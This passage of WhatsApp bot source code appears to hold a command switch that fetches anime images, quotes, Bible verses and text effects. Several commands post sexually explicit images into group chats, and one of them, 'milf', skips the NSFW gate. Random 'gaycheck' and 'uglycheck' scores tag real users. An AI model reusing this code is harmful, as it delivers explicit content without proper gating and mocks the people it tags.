            await EliteProEmpire.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animeyeet':{
await XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/yeet`)       
            await EliteProEmpire.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animebite':{
await XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/bite`)       
            await EliteProEmpire.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animelick':{
await XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/lick`)       
            await EliteProEmpire.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animekill':{
await XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/kill`)       
            await EliteProEmpire.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animecry':{
await XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/cry`)       
            await EliteProEmpire.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animewlp':{
await XeonStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/wallpaper`)       
            await EliteProEmpire.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animekiss':{
await XeonStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/kiss`)       
            await EliteProEmpire.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animehug':{
await XeonStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/hug`)       
            await EliteProEmpire.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animeneko':{
await XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/neko`)       
            await EliteProEmpire.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animepat':{
await XeonStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/pat`)       
            await EliteProEmpire.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animeslap':{
await XeonStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/slap`)       
            await EliteProEmpire.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animecuddle':{
await XeonStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/cuddle`)       
            await EliteProEmpire.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animewaifu':{
await XeonStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/waifu`)       
            await EliteProEmpire.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animenom':{
await XeonStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/nom`)       
            await EliteProEmpire.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animefoxgirl':{
await XeonStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/fox_girl`)       
            await EliteProEmpire.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animetickle': {
await XeonStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/tickle`)     
            await EliteProEmpire.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animegecg': {
await XeonStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/gecg`)     
            await EliteProEmpire.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'dogwoof': {
await XeonStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/woof`)     
            await EliteProEmpire.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case '8ballpool': {
await XeonStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/8ball`)     
            await EliteProEmpire.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'goosebird': {
await XeonStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/goose`)     
            await EliteProEmpire.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animefeed': {
await XeonStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/feed`)     
            await EliteProEmpire.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animeavatar': {
await XeonStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/avatar`)     
            await EliteProEmpire.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'lizardpic': {
await XeonStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/lizard`)     
            await EliteProEmpire.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'catmeow': {
await XeonStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/meow`)     
            await EliteProEmpire.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animesearch': {
if (!text) return reply(`Which anime are you lookin for?`)
const malScraper = require('mal-scraper')
await XeonStickWait()
        const anime = await malScraper.getInfoFromName(text).catch(() => null)
        if (!anime) return reply(`Could not find`)
let animetxt = `
🎀 *Title: ${anime.title}*
🎋 *Type: ${anime.type}*
🎐 *Premiered on: ${anime.premiered}*
💠 *Total Episodes: ${anime.episodes}*
📈 *Status: ${anime.status}*
💮 *Genres: ${anime.genres}
📍 *Studio: ${anime.studios}*
🌟 *Score: ${anime.score}*
💎 *Rating: ${anime.rating}*
🏅 *Rank: ${anime.ranked}*
💫 *Popularity: ${anime.popularity}*
♦️ *Trailer: ${anime.trailer}*
🌐 *URL: ${anime.url}*
❄ *Description:* ${anime.synopsis}*`
                await EliteProEmpire.sendMessage(m.chat,{image:{url:anime.picture}, caption:animetxt},{quoted:m})
                }
                break
case 'hentaivid': case 'hentai': case 'hentaivideo': {
	if (!m.isGroup) return reply("This command is for group use only.")
if (!AntiNsfw) return reply(mess.nsfw)
                await XeonStickWait()
                const { hentai } = require('./lib/scraper.js')
                anu = await hentai()
                result912 = anu[Math.floor(Math.random(), anu.length)]
                EliteProEmpire.sendMessage(m.chat, { video: { url: result912.video_1 }, caption: `${themeemoji} Title : ${result912.title}\n${themeemoji} Category : ${result912.category}\n${themeemoji} Mimetype : ${result912.type}\n${themeemoji} Views : ${result912.views_count}\n${themeemoji} Shares : ${result912.share_count}\n${themeemoji} Source : ${result912.link}\n${themeemoji} Media Url : ${result912.video_1}` }, { quoted: m })
            }
            break
case 'trap' :
if (!m.isGroup) return reply("This command is for group use only.")
if (!AntiNsfw) return reply(mess.nsfw)
await XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/nsfw/${command}`)       
EliteProEmpire.sendMessage(m.chat, { caption: mess.success, image: { url:waifudd.data.url } }, { quoted: m })
break
case 'hentai-neko' :
case 'hneko' :
if (!m.isGroup) return reply("This command is for group use only.")
if (!AntiNsfw) return reply(mess.nsfw)
    waifudd = await axios.get(`https://waifu.pics/api/nsfw/neko`)
EliteProEmpire.sendMessage(m.chat, { caption: mess.success, image: { url:waifudd.data.url } }, { quoted: m })
break
case 'hentai-waifu' :
case 'nwaifu' :
if (!m.isGroup) return reply("This command is for group use only.")
if (!AntiNsfw) return reply(mess.nsfw)
await XeonStickWait()
    waifudd = await axios.get(`https://waifu.pics/api/nsfw/waifu`)         
EliteProEmpire.sendMessage(m.chat, { caption: mess.success, image: { url:waifudd.data.url } }, { quoted: m })
break
case 'gasm':
if (!m.isGroup) return reply("This command is for group use only.")
	if (!AntiNsfw) return reply(mess.nsfw)
await XeonStickWait()						
 waifudd = await axios.get(`https://nekos.life/api/v2/img/${command}`)
EliteProEmpire.sendMessage(m.chat, { caption: mess.success, image: { url:waifudd.data.url } }, { quoted: m })
break  
case 'milf':
if (!m.isGroup) return reply("This command is for group use only.")
await XeonStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/milf.json'))
var xeonyresult = pickRandom(ahegaonsfw)
EliteProEmpire.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break 
case 'animespank':
if (!m.isGroup) return reply("This command is for group use only.")
if (!AntiNsfw) return reply(mess.nsfw)
await XeonStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/spank`)     
            await EliteProEmpire.sendMessage(m.chat, { caption:  `Here you go!`, image: {url:waifudd.data.url} },{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'blowjob':
if (!m.isGroup) return reply("This command is for group use only.")
	if (!AntiNsfw) return reply(mess.nsfw)
await XeonStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/blowjob.json'))
var xeonyresult = pickRandom(ahegaonsfw)
EliteProEmpire.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'cuckold':
if (!m.isGroup) return reply("This command is for group use only.")
	if (!AntiNsfw) return reply(mess.nsfw)
await XeonStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/cuckold.json'))
var xeonyresult = pickRandom(ahegaonsfw)
EliteProEmpire.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'eba':
if (!m.isGroup) return reply("This command is for group use only.")
	if (!AntiNsfw) return reply(mess.nsfw)
await XeonStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/eba.json'))
var xeonyresult = pickRandom(ahegaonsfw)
EliteProEmpire.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'pussy':
if (!m.isGroup) return reply("This command is for group use only.")
	if (!AntiNsfw) return reply(mess.nsfw)
await XeonStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/pussy.json'))
var xeonyresult = pickRandom(ahegaonsfw)
EliteProEmpire.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'yuri':
if (!m.isGroup) return reply("This command is for group use only.")
	if (!AntiNsfw) return reply(mess.nsfw)
await XeonStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/yuri.json'))
var xeonyresult = pickRandom(ahegaonsfw)
EliteProEmpire.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'zettai':
if (!m.isGroup) return reply("This command is for group use only.")
	if (!AntiNsfw) return reply(mess.nsfw)
await XeonStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/zettai.json'))
var xeonyresult = pickRandom(ahegaonsfw)
EliteProEmpire.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'gifblowjob':
if (!m.isGroup) return reply("This command is for group use only.")
if (!AntiNsfw) return reply(mess.nsfw)
await XeonStickWait()
  let assss = await axios.get ("https://api.waifu.pics/nsfw/blowjob")
    var bobuff = await fetchBuffer(assss.data.url)
    var bogif = await buffergif(bobuff)
    await EliteProEmpire.sendMessage(m.chat,{video:bogif, gifPlayback:true },{quoted:m}).catch(err => {
    })
    break
case 'checkme':
					neme = args.join(" ")
					bet = `${sender}`
					var sifat = ['Fine','Unfriendly','Chapri','Nibba/nibbi','Annoying','Dilapidated','Angry person','Polite','Burden','Great','Cringe','Liar']
					var hoby = ['Cooking','Dancing','Playing','Gaming','Painting','Helping Others','Watching anime','Reading','Riding Bike','Singing','Chatting','Sharing Memes','Drawing','Eating Parents Money','Playing Truth or Dare','Staying Alone']
					var bukcin = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var arp = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var cakep = ['Yes','No','Very Ugly','Very Handsome']
					var wetak= ['Caring','Generous','Angry person','Sorry','Submissive','Fine','Im sorry','Kind Hearted','Patient','UwU','Top','Helpful']
					var baikk = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var bhuruk = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var cerdhas = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var berhani = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var mengheikan = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var sipat = sifat[Math.floor(Math.random() * sifat.length)]
					var biho = hoby[Math.floor(Math.random() * hoby.length)]
					var bhucin = bukcin[Math.floor(Math.random() * bukcin.length)]
					var senga = arp[Math.floor(Math.random() * arp.length)]
					var chakep = cakep[Math.floor(Math.random() * cakep.length)]
					var watak = wetak[Math.floor(Math.random() * wetak.length)]
					var baik = baikk[Math.floor(Math.random() * baikk.length)]
					var burug = bhuruk[Math.floor(Math.random() * bhuruk.length)]
					var cerdas = cerdhas[Math.floor(Math.random() * cerdhas.length)]
					var berani = berhani[Math.floor(Math.random() * berhani.length)]
					var takut = mengheikan[Math.floor(Math.random() * mengheikan.length)]
					 profile = `*≡══《 Check @${bet.split('@')[0]} 》══≡*

*Name :* ${pushname}
*Characteristic :* ${sipat}
*Hobby :* ${biho}
*Simp :* ${bhucin}%
*Great :* ${senga}%
*Handsome :* ${chakep}
*Character :* ${watak}
*Good Morals :* ${baik}%
*Bad Morals :* ${burug}%
*Intelligence :* ${cerdas}%
*Courage :* ${berani}%
*Afraid :* ${takut}%

*≡═══《 CHECK PROPERTIES 》═══≡*`
					try {
ppuser = await EliteProEmpire.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
ppxeon = await getBuffer(ppuser)
EliteProEmpire.sendMessage(from, { image: ppxeon, caption: profile, mentions: [bet]},{quoted:m})
break
case 'handsomecheck':
				if (!text) return reply(`Tag Someone, Example : ${prefix + command} @ElitePro`)
					const gan = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const teng = gan[Math.floor(Math.random() * gan.length)]
EliteProEmpire.sendMessage(from, { text: `*${command}*\n\nName : ${q}\nAnswer : *${teng}%*` }, { quoted: m })
					break
case 'beautifulcheck':
				if (!text) return reply(`Tag Someone, Example : ${prefix + command} @ElitePro`)
					const can = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const tik = can[Math.floor(Math.random() * can.length)]
EliteProEmpire.sendMessage(from, { text: `*${command}*\n\nNama : ${q}\nAnswer : *${tik}%*` }, { quoted: m })
					break
					case 'charactercheck':
					if (!text) return reply(`Tag Someone, Example : ${prefix + command} @ElitePro`)
					const xeony =['Compassionate','Generous','Grumpy','Forgiving','Obedient','Good','Simp','Kind-Hearted','patient','UwU','top, anyway','Helpful']
					const taky = xeony[Math.floor(Math.random() * xeony.length)]
					EliteProEmpire.sendMessage(from, { text: `Character Check : ${q}\nAnswer : *${taky}*` }, { quoted: m })
				     break
case 'awesomecheck':
  case 'greatcheck':
    case 'gaycheck':
      case 'cutecheck':
        case 'lesbicheck':
          case 'lesbiancheck':
             case 'hornycheck':
                 case 'prettycheck':
                    case 'lovelycheck':
                      case 'uglycheck':
if (!m.isGroup) return reply("This command is for group use only.")
const cex = body.slice(0)
const cek1 = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
const cek2 = cek1[Math.floor(Math.random() * cek1.length)]
if (mentionByReply) {
EliteProEmpire.sendMessage(from, { text: 'Question : *' + cex + '*\nChecker : ' + `@${mentionByReply.split('@')[0]}` + '\nAnswer : ' + cek2 + '%', mentions: [mentionByReply] }, { quoted: m })
} else if (mentionByTag[0] && isGroup) {
EliteProEmpire.sendMessage(from, { text: 'Question : *' + cex + '*\nChecker : ' + `@${mentionByTag[0].split('@')[0]}` + '\nAnswer : ' + cek2 + '%', mentions: [mentionByTag[0]] }, { quoted: m })
} else if (!mentionByReply && !mentionByTag[0]) {
EliteProEmpire.sendMessage(from, { text: 'Question : *' + cex + '*\nChecker : ' + `@${sender.split('@')[0]}` + '\nAnswer : ' + cek2 + '%', mentions: [sender] }, { quoted: m })
}
break
case 'gura':
case 'gurastick':{
var ano = await fetchJson('https://raw.githubusercontent.com/Cyrilix-XMD/CYRILIX-STORE/main/img-xi/gura')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await EliteProEmpire.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })

}
break
case 'telestick': {
	if (m.isGroup) return reply("This command is made for private chat.")
		if (args[0] && args[0].match(/(https:\/\/t.me\/addstickers\/)/gi)) {
		let xeonresources = await Telesticker(args[0])
		await reply(`Sending ${xeonresources.length} stickers...`)
		if (m.isGroup && xeonresources.length > 30) {
			await reply('Number of stickers more than 30, bot will send it in private chat.')
			for (let i = 0; i < xeonresources.length; i++) {
				EliteProEmpire.sendMessage(m.sender, { sticker: { url: xeonresources[i].url }})
			}
		} else {
			for (let i = 0; i < xeonresources.length; i++) {
				EliteProEmpire.sendMessage(m.chat, { sticker: { url: xeonresources[i].url }})
			}
		}
	} else reply(`Where is the telegram sticker link?\nExample. ${prefix + command} https://t.me/addstickers/FriendlyDeath`)
}
break
case 'shadow': 
case 'write': 
case 'romantic': 
case 'burnpaper':
case 'smoke': 
case 'narutobanner': 
case 'love': 
case 'undergrass':
case 'doublelove': 
case 'coffecup':
case 'underwaterocean':
case 'smokyneon':
case 'starstext':
case 'rainboweffect':
case 'balloontext':
case 'metalliceffect':
case 'embroiderytext':
case 'flamingtext':
case 'stonetext':
case 'writeart':
case 'summertext':
case 'wolfmetaltext':
case 'nature3dtext':
case 'rosestext':
case 'naturetypography':
case 'quotesunder':
case 'shinetext':{
if (!q) return reply(`Example : ${prefix+command} EliteProEmpire`) 
await XeonStickWait()
const photooxy = require('./lib/photooxy.js')
let link
if (/stonetext/.test(command)) link = 'https://photooxy.com/online-3d-white-stone-text-effect-utility-411.html'
if (/writeart/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-art-quote-on-wood-heart-370.html'
if (/summertext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/3d-summer-text-effect-367.html'
if (/wolfmetaltext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/create-a-wolf-metal-text-effect-365.html'
if (/nature3dtext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/make-nature-3d-text-effects-364.html'
if (/rosestext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/yellow-roses-text-360.html'
if (/naturetypography/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/create-vector-nature-typography-355.html'
if (/quotesunder/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/quotes-under-fall-leaves-347.html'
if (/shinetext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/rainbow-shine-text-223.html'
if (/shadow/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/shadow-text-effect-in-the-sky-394.html'
if (/write/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-text-on-the-cup-392.html'
if (/romantic/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/romantic-messages-for-your-loved-one-391.html'
if (/burnpaper/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-text-on-burn-paper-388.html'
if (/smoke/.test(command)) link = 'https://photooxy.com/other-design/create-an-easy-smoke-type-effect-390.html'
if (/narutobanner/.test(command)) link = 'https://photooxy.com/manga-and-anime/make-naruto-banner-online-free-378.html'
if (/love/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/create-a-picture-of-love-message-377.html'
if (/undergrass/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/make-quotes-under-grass-376.html'
if (/doublelove/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/love-text-effect-372.html'
if (/coffecup/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/put-any-text-in-to-coffee-cup-371.html'
if (/underwaterocean/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/creating-an-underwater-ocean-363.html'
if (/smokyneon/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/make-smoky-neon-glow-effect-343.html'
if (/starstext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-stars-text-on-the-night-sky-200.html'
if (/rainboweffect/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/glow-rainbow-effect-generator-201.html'
if (/balloontext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/royal-look-text-balloon-effect-173.html'
if (/metalliceffect/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/illuminated-metallic-effect-177.html'
if (/embroiderytext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/create-embroidery-text-online-191.html'
if (/flamingtext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/realistic-flaming-text-effect-online-197.html'
let dehe = await photooxy.photoOxy(link, q)
EliteProEmpire.sendMessage(m.chat, { image: { url: dehe }, caption: mess.success}, { quoted: m })
}
break
case 'setcmd': {
                if (!m.quoted) return reply('Reply Message!')
                if (!m.quoted.fileSha256) return reply('SHA256 Hash Missing')
                if (!text) return reply(`For What Command?`)
                let hash = m.quoted.fileSha256.toString('base64')
                if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) return reply('You have no permission to change this sticker command')
                global.db.data.sticker[hash] = {
                    text,
                    mentionedJid: m.mentionedJid,
                    creator: m.sender,
                    at: + new Date,
                    locked: false,
                }
                reply(`Done!`)
            }
            break
case 'delcmd': {
                let hash = m.quoted.fileSha256.toString('base64')
                if (!hash) return reply(`No hashes`)
                if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) return reply('You have no permission to delete this sticker command')             
                delete global.db.data.sticker[hash]
                reply(`Done!`)
            }
            break
case 'listcmd': {
                let teks = `
*List Hash*
Info: *bold* hash is Locked
${Object.entries(global.db.data.sticker).map(([key, value], index) => `${index + 1}. ${value.locked ? `*${key}*` : key} : ${value.text}`).join('\n')}
`.trim()
                EliteProEmpire.sendText(m.chat, teks, m, { mentions: Object.values(global.db.data.sticker).map(x => x.mentionedJid).reduce((a,b) => [...a, ...b], []) })
            }
            break 
case 'lockcmd': {
                if (!XeonTheCreator) return reply("This command is only made for my owner.")
                if (!m.quoted) return reply('Reply Message!')
                if (!m.quoted.fileSha256) return reply('SHA256 Hash Missing')
                let hash = m.quoted.fileSha256.toString('base64')
                if (!(hash in global.db.data.sticker)) return reply('Hash not found in database')
                global.db.data.sticker[hash].locked = !/^un/i.test(command)
                reply('Done!')
            }
            break
            case 'ss': case 'ssweb': {
if (!q) return reply(`Example ${prefix+command} link`)
await XeonStickWait()
let krt = await scp2.ssweb(q)
EliteProEmpire.sendMessage(from,{image:krt.result,caption:mess.succes}, {quoted:m})
}
break
case 'pickupline': {
try {
    let res = await fetch(`https://api.popcat.xyz/pickuplines`)
    if (!res.ok) {
      throw new Error(`API request failed with status ${res.status}`)
    }
    let json = await res.json()
    let pickupLine = `*Here's a pickup line for you:*\n\n${json.pickupline}`
    reply(pickupLine)
  } catch (error) {
    console.error(error)
    // Handle the error appropriately
  }
  }
  break
  case 'animequote': {
  try {
    const res = await fetch('https://some-random-api.com/animu/quote');
    if (!res.ok) throw await res.text()
    const json = await res.json()
    const { sentence, character, anime } = json
    const message = `${themeemoji}Quote\n${sentence}\n\n${themeemoji}Character: \`\`\`${character}\`\`\`\n${themeemoji}Anime: \`\`\`${anime}\`\`\`\n`
    EliteProEmpire.sendMessage(m.chat, { text: message }, 'extendedTextMessage', { quoted: m })
  } catch (error) {
    console.error(error)
  }
  }
  break
  case 'bible': {
  	const { translate } = require('@vitalets/google-translate-api')
  	const BASE_URL = 'https://bible-api.com'
  try {
    // Extract the chapter number or name from the command text.
    let chapterInput = m.text.split(' ').slice(1).join('').trim()
    if (!chapterInput) {
      throw new Error(`Please specify the chapter number or name. Example: ${prefix + command} john 3:16`)
    }
    // Encode the chapterInput to handle special characters
    chapterInput = encodeURIComponent(chapterInput);
    // Make an API request to fetch the chapter information.
    let chapterRes = await fetch(`${BASE_URL}/${chapterInput}`)
    if (!chapterRes.ok) {
      throw new Error(`Please specify the chapter number or name. Example: ${prefix + command} john 3:16`)
    }
    let chapterData = await chapterRes.json();
    let translatedChapterHindi = await translate(chapterData.text, { to: 'hi', autoCorrect: true })
    let translatedChapterEnglish = await translate(chapterData.text, { to: 'en', autoCorrect: true })
    let bibleChapter = `*THE HOLY BIBLE*\n
*Chapter ${chapterData.reference}*
Version: ${chapterData.translation_name}
Number of verses: ${chapterData.verses.length}\n
*Chapter Content (English):*\n
${translatedChapterEnglish.text}\n
*Chapter Content (Hindi):*\n
${translatedChapterHindi.text}`
    reply(bibleChapter)
  } catch (error) {
    reply(`Error: ${error.message}`)
  }
  }
  break
  case 'dalle': {
